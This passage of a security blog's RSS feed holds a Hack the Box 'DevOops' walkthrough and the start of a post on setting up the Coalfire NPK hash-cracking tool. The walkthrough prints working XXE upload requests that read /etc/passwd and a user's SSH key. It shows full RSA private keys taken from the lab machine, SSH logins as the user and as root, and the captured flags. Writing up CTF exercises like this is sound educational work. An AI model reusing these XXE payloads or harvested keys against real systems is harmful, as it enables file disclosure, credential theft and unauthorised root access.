+&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;
+<span class="highlight">  &lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt;
+  &lt;!ENTITY xxe SYSTEM "file:///etc/passwd" &gt;]&gt;</span>
+&lt;test&gt;
+    &lt;Author&gt;Test&lt;/Author&gt;
+    &lt;Subject&gt;Test&lt;/Subject&gt;
+    &lt;Content&gt;Test&lt;/Content&gt;
+&lt;/test&gt;
+
+------WebKitFormBoundarymfAR6unm6rnoKPEA--
+</pre>
+<p>While this did not work, the system processed my post and gave me a bit of file system information.</p>
+<pre class="console">
+HTTP/1.1 200 OK
+Server: gunicorn/19.7.1
+Date: Thu, 19 Dec 2019 20:25:26 GMT
+Connection: close
+Content-Type: text/html; charset=utf-8
+Content-Length: 150
+
+ PROCESSED BLOGPOST: 
+  Author: Test
+ Subject: Test
+ Content: Test
+ URL for later reference: /uploads/test.xml
+ File path: /home/roosa/deploy/src
+</pre>
+<p>After realizing that I needed somewhere to output the /etc/passwd, I changed my author field in the uploaded file.</p>
+<pre class="console">
+POST /upload HTTP/1.1
+Host: 10.10.10.91:5000
+Content-Length: 415
+Cache-Control: max-age=0
+Origin: http://10.10.10.91:5000
+Upgrade-Insecure-Requests: 1
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundarymfAR6unm6rnoKPEA
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3910.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
+Referer: http://10.10.10.91:5000/upload
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Connection: close
+
+------WebKitFormBoundarymfAR6unm6rnoKPEA
+Content-Disposition: form-data; name="file"; filename="test.xml"
+Content-Type: text/xml
+
+&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;
+  &lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt;
+  &lt;!ENTITY xxe SYSTEM "file:///etc/passwd" &gt;]&gt;
+&lt;test&gt;
+<span class="highlight">    &lt;Author&gt;&xxe;&lt;/Author&gt;</span>
+    &lt;Subject&gt;Test&lt;/Subject&gt;
+    &lt;Content&gt;Test&lt;/Content&gt;
+&lt;/test&gt;
+
+------WebKitFormBoundarymfAR6unm6rnoKPEA--
+</pre>
+<p>When I uploaded this file, the server populated my author field with the results of the /etc/passwd file!</p>
+<pre class="console">
+HTTP/1.1 200 OK
+Server: gunicorn/19.7.1
+Date: Thu, 19 Dec 2019 20:26:02 GMT
+Connection: close
+Content-Type: text/html; charset=utf-8
+Content-Length: 2585
+
+ PROCESSED BLOGPOST: 
+  Author: root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
+systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
+systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
+systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
+syslog:x:104:108::/home/syslog:/bin/false
+_apt:x:105:65534::/nonexistent:/bin/false
+messagebus:x:106:110::/var/run/dbus:/bin/false
+uuidd:x:107:111::/run/uuidd:/bin/false
+lightdm:x:108:114:Light Display Manager:/var/lib/lightdm:/bin/false
+whoopsie:x:109:117::/nonexistent:/bin/false
+avahi-autoipd:x:110:119:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false
+avahi:x:111:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
+dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/bin/false
+colord:x:113:123:colord colour management daemon,,,:/var/lib/colord:/bin/false
+speech-dispatcher:x:114:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false
+hplip:x:115:7:HPLIP system user,,,:/var/run/hplip:/bin/false
+kernoops:x:116:65534:Kernel Oops Tracking Daemon,,,:/:/bin/false
+pulse:x:117:124:PulseAudio daemon,,,:/var/run/pulse:/bin/false
+rtkit:x:118:126:RealtimeKit,,,:/proc:/bin/false
+saned:x:119:127::/var/lib/saned:/bin/false
+usbmux:x:120:46:usbmux daemon,,,:/var/lib/usbmux:/bin/false
+osboxes:x:1000:1000:osboxes.org,,,:/home/osboxes:/bin/false
+git:x:1001:1001:git,,,:/home/git:/bin/bash
+roosa:x:1002:1002:,,,:/home/roosa:/bin/bash
+sshd:x:121:65534::/var/run/sshd:/usr/sbin/nologin
+blogfeed:x:1003:1003:,,,:/home/blogfeed:/bin/false
+
+ Subject: Test
+ Content: Test
+ URL for later reference: /uploads/test.xml
+ File path: /home/roosa/deploy/src
+</pre>
+<p>It took a while to figure out how to exploit this for system-level access. That said, I eventually settled on grabbing the 'roosa' user's private key.</p>
+<pre class="console">
+POST /upload HTTP/1.1
+Host: 10.10.10.91:5000
+Content-Length: 427
+Cache-Control: max-age=0
+Origin: http://10.10.10.91:5000
+Upgrade-Insecure-Requests: 1
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundarymfAR6unm6rnoKPEA
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3910.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
+Referer: http://10.10.10.91:5000/upload
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Connection: close
+
+------WebKitFormBoundarymfAR6unm6rnoKPEA
+Content-Disposition: form-data; name="file"; filename="test.xml"
+Content-Type: text/xml
+
+&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;
+  &lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt;
+<span class="highlight">  &lt;!ENTITY xxe SYSTEM "file:///home/roosa/.ssh/id_rsa" &gt;]&gt;</span>
+&lt;test&gt;
+    &lt;Author&gt;&xxe;&lt;/Author&gt;
+    &lt;Subject&gt;Test&lt;/Subject&gt;
+    &lt;Content&gt;Test&lt;/Content&gt;
+&lt;/test&gt;
+
+------WebKitFormBoundarymfAR6unm6rnoKPEA--
+</pre>
+<p>This ended up working, which was a good start.</p>
+<pre class="console">
+HTTP/1.1 200 OK
+Server: gunicorn/19.7.1
+Date: Thu, 19 Dec 2019 20:29:07 GMT
+Connection: close
+Content-Type: text/html; charset=utf-8
+Content-Length: 1821
+
+ PROCESSED BLOGPOST: 
+  Author: -----BEGIN RSA PRIVATE KEY-----
+MIIEogIBAAKCAQEAuMMt4qh/ib86xJBLmzePl6/5ZRNJkUj/Xuv1+d6nccTffb/7
+9sIXha2h4a4fp18F53jdx3PqEO7HAXlszAlBvGdg63i+LxWmu8p5BrTmEPl+cQ4J
+R/R+exNggHuqsp8rrcHq96lbXtORy8SOliUjfspPsWfY7JbktKyaQK0JunR25jVk
+v5YhGVeyaTNmSNPTlpZCVGVAp1RotWdc/0ex7qznq45wLb2tZFGE0xmYTeXgoaX4
+9QIQQnoi6DP3+7ErQSd6QGTq5mCvszpnTUsmwFj5JRdhjGszt0zBGllsVn99O90K
+m3pN8SN1yWCTal6FLUiuxXg99YSV0tEl0rfSUwIDAQABAoIBAB6rj69jZyB3lQrS
+JSrT80sr1At6QykR5ApewwtCcatKEgtu1iWlHIB9TTUIUYrYFEPTZYVZcY50BKbz
+ACNyme3rf0Q3W+K3BmF//80kNFi3Ac1EljfSlzhZBBjv7msOTxLd8OJBw8AfAMHB
+lCXKbnT6onYBlhnYBokTadu4nbfMm0ddJo5y32NaskFTAdAG882WkK5V5iszsE/3
+koarlmzP1M0KPyaVrID3vgAvuJo3P6ynOoXlmn/oncZZdtwmhEjC23XALItW+lh7
+e7ZKcMoH4J2W8OsbRXVF9YLSZz/AgHFI5XWp7V0Fyh2hp7UMe4dY0e1WKQn0wRKe
+8oa9wQkCgYEA2tpna+vm3yIwu4ee12x2GhU7lsw58dcXXfn3pGLW7vQr5XcSVoqJ
+Lk6u5T6VpcQTBCuM9+voiWDX0FUWE97obj8TYwL2vu2wk3ZJn00U83YQ4p9+tno6
+NipeFs5ggIBQDU1k1nrBY10TpuyDgZL+2vxpfz1SdaHgHFgZDWjaEtUCgYEA2B93
+hNNeXCaXAeS6NJHAxeTKOhapqRoJbNHjZAhsmCRENk6UhXyYCGxX40g7i7T15vt0
+ESzdXu+uAG0/s3VNEdU5VggLu3RzpD1ePt03eBvimsgnciWlw6xuZlG3UEQJW8sk
+A3+XsGjUpXv9TMt8XBf3muESRBmeVQUnp7RiVIcCgYBo9BZm7hGg7l+af1aQjuYw
+agBSuAwNy43cNpUpU3Ep1RT8DVdRA0z4VSmQrKvNfDN2a4BGIO86eqPkt/lHfD3R
+KRSeBfzY4VotzatO5wNmIjfExqJY1lL2SOkoXL5wwZgiWPxD00jM4wUapxAF4r2v
+vR7Gs1zJJuE4FpOlF6SFJQKBgHbHBHa5e9iFVOSzgiq2GA4qqYG3RtMq/hcSWzh0
+8MnE1MBL+5BJY3ztnnfJEQC9GZAyjh2KXLd6XlTZtfK4+vxcBUDk9x206IFRQOSn
+y351RNrwOc2gJzQdJieRrX+thL8wK8DIdON9GbFBLXrxMo2ilnBGVjWbJstvI9Yl
+aw0tAoGAGkndihmC5PayKdR1PYhdlVIsfEaDIgemK3/XxvnaUUcuWi2RhX3AlowG
+xgQt1LOdApYoosALYta1JPen+65V02Fy5NgtoijLzvmNSz+rpRHGK6E8u3ihmmaq
+82W3d4vCUPkKnrgG8F7s3GL6cqWcbZBd0j9u88fUWfPxfRaQU3s=
+-----END RSA PRIVATE KEY-----
+
+ Subject: Test
+ Content: Test
+ URL for later reference: /uploads/test.xml
+ File path: /home/roosa/deploy/src
+</pre>
+<p>When I tried to use this private key, it worked, and I had a shell on the box!</p>
+<pre class="console">
+<span class="prompt">root@kali</span>:<span class="dir">~/HtB/DevOops</span># ssh -i roosa_rsa_10-10-10-91 roosa@10.10.10.91
+Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.13.0-37-generic i686)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+135 packages can be updated.
+60 updates are security updates.
+
+Last login: Thu Dec 19 15:32:22 2019 from 10.10.14.2
+roosa@gitter:~$ id
+uid=1002(roosa) gid=1002(roosa) groups=1002(roosa),4(adm),27(sudo)
+</pre>
+<p>Before moving on, I grabbed the user flag, and scored my points in HtB.</p>
+<pre class="console">
+roosa@gitter:~$ cat user.txt 
+c5808e1643e801d40f09ed87cdecc67b
+</pre>
+<h2>Privilege Escalation</h2>
+<p>With a user-level shell, it was time to escalate to root.</p>
+<p>First, I found a service.sh file that seemed interesting, but I realized that it was running as the 'roosa' user.</p>
+<pre class="console">
+roosa@gitter:~$ diff service.sh service.sh\~
+11,12c11,12
+&lt; SCRIPT="/home/roosa/run-blogfeed.sh"
+&lt; RUNAS=roosa
+---
+&gt; SCRIPT="&lt;COMMAND&gt;"
+&gt; RUNAS=&lt;USERNAME&gt;
+14,15c14,15
+&lt; PIDFILE=/var/run/blogfeed.pid
+&lt; LOGFILE=/var/log/blogfeed.log
+---
+&gt; PIDFILE=/var/run/&lt;NAME&gt;.pid
+&gt; LOGFILE=/var/log/&lt;NAME&gt;.log
+48a49,63
+&gt; uninstall() {
+&gt;   echo -n "Are you really sure you want to uninstall this service? That cannot be undone. [yes|No] "
+&gt;   local SURE
+&gt;   read SURE
+&gt;   if [ "$SURE" = "yes" ]; then
+&gt;     stop
+&gt;     rm -f "$PIDFILE"
+&gt;     echo "Notice: log file was not removed: $LOGFILE" &gt;&2
+&gt;     update-rc.d -f $NAME remove
+&gt;     rm -fv "$0"
+&gt;   else
+&gt;     echo "Abort!"
+&gt;   fi
+&gt; }
+&gt; 
+73a89,91
+&gt;   uninstall)
+&gt;     uninstall
+&gt;     ;;
+79c97
+&lt;     echo "Usage: $0 {start|stop|status|restart}"
+---
+&gt;     echo "Usage: $0 {start|stop|status|restart|uninstall}"
+</pre>
+<p>I also found an RSA private key in the '/home/roosa/work/blogfeed/resources/integration' directory, but I wasn't sure what to do with it.</p>
+<pre class="console">
+roosa@gitter:~/work/blogfeed/resources/integration$ pwd
+/home/roosa/work/blogfeed/resources/integration
+roosa@gitter:~/work/blogfeed/resources/integration$ cat authcredentials.key 
+-----BEGIN RSA PRIVATE KEY-----
+MIIEpQIBAAKCAQEApc7idlMQHM4QDf2d8MFjIW40UickQx/cvxPZX0XunSLD8veN
+ouroJLw0Qtfh+dS6y+rbHnj4+HySF1HCAWs53MYS7m67bCZh9Bj21+E4fz/uwDSE
+23g18kmkjmzWQ2AjDeC0EyWH3k4iRnABruBHs8+fssjW5sSxze74d7Ez3uOI9zPE
+sQ26ynmLutnd/MpyxFjCigP02McCBrNLaclcbEgBgEn9v+KBtUkfgMgt5CNLfV8s
+ukQs4gdHPeSj7kDpgHkRyCt+YAqvs3XkrgMDh3qI9tCPfs8jHUvuRHyGdMnqzI16
+ZBlx4UG0bdxtoE8DLjfoJuWGfCF/dTAFLHK3mwIDAQABAoIBADelrnV9vRudwN+h
+LZ++l7GBlge4YUAx8lkipUKHauTL5S2nDZ8O7ahejb+dSpcZYTPM94tLmGt1C2bO
+JqlpPjstMu9YtIhAfYF522ZqjRaP82YIekpaFujg9FxkhKiKHFms/2KppubiHDi9
+oKL7XLUpSnSrWQyMGQx/Vl59V2ZHNsBxptZ+qQYavc7bGP3h4HoRurrPiVlmPwXM
+xL8NWx4knCZEC+YId8cAqyJ2EC4RoAr7tQ3xb46jC24Gc/YFkI9b7WCKpFgiszhw
+vFvkYQDuIvzsIyunqe3YR0v8TKEfWKtm8T9iyb2yXTa+b/U3I9We1P+0nbfjYX8x
+6umhQuECgYEA0fvp8m2KKJkkigDCsaCpP5dWPijukHV+CLBldcmrvUxRTIa8o4e+
+OWOMW1JPEtDTj7kDpikekvHBPACBd5fYnqYnxPv+6pfyh3H5SuLhu9PPA36MjRyE
+4+tDgPvXsfQqAKLF3crG9yKVUqw2G8FFo7dqLp3cDxCs5sk6Gq/lAesCgYEAyiS0
+937GI+GDtBZ4bjylz4L5IHO55WI7CYPKrgUeKqi8ovKLDsBEboBbqRWcHr182E94
+SQMoKu++K1nbly2YS+mv4bOanSFdc6bT/SAHKdImo8buqM0IhrYTNvArN/Puv4VT
+Nszh8L9BDEc/DOQQQzsKiwIHab/rKJHZeA6cBRECgYEAgLg6CwAXBxgJjAc3Uge4
+eGDe3y/cPfWoEs9/AptjiaD03UJi9KPLegaKDZkBG/mjFqFFmV/vfAhyecOdmaAd
+i/Mywc/vzgLjCyBUvxEhazBF4FB8/CuVUtnvAWxgJpgT/1vIi1M4cFpkys8CRDVP
+6TIQBw+BzEJemwKTebSFX40CgYEAtZt61iwYWV4fFCln8yobka5KoeQ2rCWvgqHb
+8rH4Yz0LlJ2xXwRPtrMtJmCazWdSBYiIOZhTexe+03W8ejrla7Y8ZNsWWnsCWYgV
+RoGCzgjW3Cc6fX8PXO+xnZbyTSejZH+kvkQd7Uv2ZdCQjcVL8wrVMwQUouZgoCdA
+qML/WvECgYEAyNoevgP+tJqDtrxGmLK2hwuoY11ZIgxHUj9YkikwuZQOmFk3EffI
+T3Sd/6nWVzi1FO16KjhRGrqwb6BCDxeyxG508hHzikoWyMN0AA2st8a8YS6jiOog
+bU34EzQLp7oRU/TKO6Mx5ibQxkZPIHfgA1+Qsu27yIwlprQ64+oeEr0=
+-----END RSA PRIVATE KEY-----
+</pre>
+<p>When I finally looked at the git log, I noticed a reference to an accidental commit with a key.</p>
+<pre class="console">
+roosa@gitter:~/work/blogfeed/.git$ git log
+commit 7ff507d029021b0915235ff91e6a74ba33009c6d
+Author: Roosa Hakkerson <roosa@solita.fi>
+Date:   Mon Mar 26 06:13:55 2018 -0400
+
+    Use Base64 for pickle feed loading
+
+commit 26ae6c8668995b2f09bf9e2809c36b156207bfa8
+Author: Roosa Hakkerson <roosa@solita.fi>
+Date:   Tue Mar 20 15:37:00 2018 -0400
+
+    Set PIN to make debugging faster as it will no longer change every time the application code is changed. Remember to remove before production use.
+
+commit cec54d8cb6117fd7f164db142f0348a74d3e9a70
+Author: Roosa Hakkerson <roosa@solita.fi>
+Date:   Tue Mar 20 15:08:09 2018 -0400
+
+    Debug support added to make development more agile.
+
+commit ca3e768f2434511e75bd5137593895bd38e1b1c2
+Author: Roosa Hakkerson <roosa@solita.fi>
+Date:   Tue Mar 20 08:38:21 2018 -0400
+
+    Blogfeed app, initial version.
+
+commit dfebfdfd9146c98432d19e3f7d83cc5f3adbfe94
+Author: Roosa Hakkerson <roosa@solita.fi>
+Date:   Tue Mar 20 08:37:56 2018 -0400
+
+    Gunicorn startup script
+
+commit 33e87c312c08735a02fa9c796021a4a3023129ad
+Author: Roosa Hakkerson <roosa@solita.fi>
+Date:   Mon Mar 19 09:33:06 2018 -0400
+
+<span class="highlight">    reverted accidental commit with proper key</span>
+
+commit d387abf63e05c9628a59195cec9311751bdb283f
+Author: Roosa Hakkerson <roosa@solita.fi>
+Date:   Mon Mar 19 09:32:03 2018 -0400
+
+    add key for feed integration from tnerprise backend
+
+commit 1422e5a04d1b52a44e6dc81023420347e257ee5f
+Author: Roosa Hakkerson <roosa@solita.fi>
+Date:   Mon Mar 19 09:24:30 2018 -0400
+
+    Initial commit
+</pre>
+<p>Next, I looked at this specific commit, and found a reference to the previously found authcredentials.key file.</p>
+<pre class="console">
+roosa@gitter:~/work/blogfeed/.git$ git show 33e87c312c08735a02fa9c796021a4a3023129ad
+commit 33e87c312c08735a02fa9c796021a4a3023129ad
+Author: Roosa Hakkerson <roosa@solita.fi>
+Date:   Mon Mar 19 09:33:06 2018 -0400
+
+    reverted accidental commit with proper key
+
+diff --git a/resources/integration/authcredentials.key b/resources/integration/authcredentials.key
+index 44c981f..f4bde49 100644
+--- a/resources/integration/authcredentials.key
++++ b/resources/integration/authcredentials.key
+@@ -1,28 +1,27 @@
+ -----BEGIN RSA PRIVATE KEY-----
+-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
+ -----END RSA PRIVATE KEY-----
+</pre>
+<p>After a few attempts, I realized that this was the private key for the root account on the box!</p>
+<pre class="console">
+<span class="prompt">root@kali</span>:<span class="dir">~/HtB/DevOops</span># ssh -i rsa2_10-10-10-91 root@10.10.10.91
+Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.13.0-37-generic i686)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+135 packages can be updated.
+60 updates are security updates.
+
+Last login: Mon Mar 26 06:23:48 2018 from 192.168.57.1
+root@gitter:~# id
+uid=0(root) gid=0(root) groups=0(root)
+</pre>
+<p>With root access, I grabbed the root flag, and finished this machine on HtB.</p>
+<pre class="console">
+root@gitter:~# cat root.txt 
+d4fe1e7f7187407eebdd3209cb1ac7b3
+</pre>
+<h2>Hack the Box DevOops - Conclusion</h2>
+<p>This was a fun challenge, and I love finding some XXE.</p>
+<p>My HtB subscription ended after this, so I was only able to pop two boxes in the end.</p>
+<p>If you have any recommendations, then I would love to reactivate my subscription and try out a few more boxes. Alternatively, let me know if you have other suggestions for research topics or blog posts.</p>
+<p>The post <a rel="nofollow" href="https://www.doyler.net/security-not-included/hack-the-box-devoops">Hack the Box DevOops Walkthrough &#8211; XXE FTW</a> appeared first on <a rel="nofollow" href="https://www.doyler.net">doyler.net</a>.</p>
+]]></content:encoded>
+					
+					<wfw:commentRss>https://www.doyler.net/security-not-included/hack-the-box-devoops/feed</wfw:commentRss>
+			<slash:comments>0</slash:comments>
+		
+		
+		<post-id xmlns="com-wordpress:feed-additions:1">4619</post-id>	</item>
+		<item>
+		<title>Coalfire NPK &#8211; Installation, Configuration, and Usage</title>
+		<link>https://www.doyler.net/security-not-included/coalfire-npk</link>
+					<comments>https://www.doyler.net/security-not-included/coalfire-npk#respond</comments>
+		
+		<dc:creator><![CDATA[doyler]]></dc:creator>
+		<pubDate>Sat, 07 Mar 2020 17:00:52 +0000</pubDate>
+				<category><![CDATA[Security Not Included]]></category>
+		<guid isPermaLink="false">https://www.doyler.net/?p=4930</guid>
+
+					<description><![CDATA[<p>I setup Coalfire NPK recently for some password cracking and wanted to share the process and my thoughts. Coalfire NPK - Introduction First, if you've never heard of NPK, then you can check out the release announcement here. Additionally, the &#8230; <a href="https://www.doyler.net/security-not-included/coalfire-npk">Continue reading <span class="meta-nav">&#8594;</span></a></p>
+<p>The post <a rel="nofollow" href="https://www.doyler.net/security-not-included/coalfire-npk">Coalfire NPK &#8211; Installation, Configuration, and Usage</a> appeared first on <a rel="nofollow" href="https://www.doyler.net">doyler.net</a>.</p>
+]]></description>
+										<content:encoded><![CDATA[<p>I setup Coalfire NPK recently for some password cracking and wanted to share the process and my thoughts.</p>
+<p><span id="more-4930"></span></p>
+<h2>Coalfire NPK - Introduction</h2>
+<p>First, if you've never heard of NPK, then you can check out the <a href="https://www.coalfire.com/The-Coalfire-Blog/March-2019/High-Power-Hash-Cracking-with-NPK">release announcement here</a>.</p>
+<p>Additionally, the <a href="https://github.com/Coalfire-Research/npk">GitHub repository</a> is worth checking out.</p>
+<p>NPK is supposed to serve as a server-less, distributed <a href="https://www.doyler.net/security-not-included/hashcat-wpa2-cracking">hashcat</a> platform, and I'd say that is fairly true.</p>
+<p>I needed to crack some hashes for work, and I figured that this would be more cost effective than trying to buy our own cracking rig.</p>
+<h2>Prerequisites</h2>
+<p>First, I created a local copy of the repository.</p>
+<pre class="console">
+<span class="prompt">doyler@mbp</span>:<span class="dir">~/tools</span># git clone https://github.com/Coalfire-Research/npk
+Cloning into 'npk'...
+remote: Enumerating objects: 90, done.
+remote: Counting objects: 100% (90/90), done.
+remote: Compressing objects: 100% (65/65), done.
+remote: Total 761 (delta 33), reused 47 (delta 22), pack-reused 671
+Receiving objects: 100% (761/761), 5.48 MiB | 17.77 MiB/s, done.
+Resolving deltas: 100% (173/173), done.
+</pre>
+<p>Next, I installed jsonnet and jq, per the instructions.</p>
+<pre class="console">
+<span class="prompt">doyler@mbp</span>:<span class="dir">~/tools/npk</span># pip install jsonnet
